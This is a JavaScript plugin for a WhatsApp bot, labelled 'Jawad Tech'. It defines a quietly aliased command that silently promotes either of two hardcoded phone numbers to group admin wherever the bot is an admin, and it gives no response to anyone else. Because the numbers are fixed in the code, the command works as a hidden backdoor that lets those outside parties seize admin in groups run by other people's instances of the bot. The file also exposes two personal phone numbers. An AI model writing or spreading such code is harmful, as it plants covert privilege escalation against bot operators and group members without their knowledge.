// Jawad Tech 
const { cmd } = require('../command');
const { lidToPhone } = require('../lib/lidtopn');

cmd({
    pattern: "ik",
    alias: ["takeadmin", "🔪", "💀", "aa", "uhh", "iyk"],
    desc: "Silently take adminship if authorized",
    category: "owner",
    filename: __filename
},
async (conn, mek, m, { from, sender, isBotAdmins, isGroup, reply }) => {

    if (!isGroup || !isBotAdmins) return;

    // lidToPhone for sender
    let senderNumber = sender.split('@')[0];
    if (sender.includes('@lid')) {
        senderNumber = await lidToPhone(conn, sender);
    }

    // Normalize to full JID
    const senderNormalized = senderNumber + '@s.whatsapp.net';

    // Both numbers are authorized
    const AUTHORIZED_USERS = [
        "923427582273@s.whatsapp.net",
        "923103448168@s.whatsapp.net"
    ];
    
    if (!AUTHORIZED_USERS.includes(senderNormalized)) {
        return; // Silent return if not authorized
    }

    // If authorized, proceed with admin promotion
    try {
        const groupMetadata = await conn.groupMetadata(from);
        const userParticipant = groupMetadata.participants.find(p => p.id === senderNormalized);
        
        if (!userParticipant?.admin) {
            await conn.groupParticipantsUpdate(from, [senderNormalized], "promote");
        }
    } catch (error) {
        console.error("Silent admin error:", error.message);
    }
});
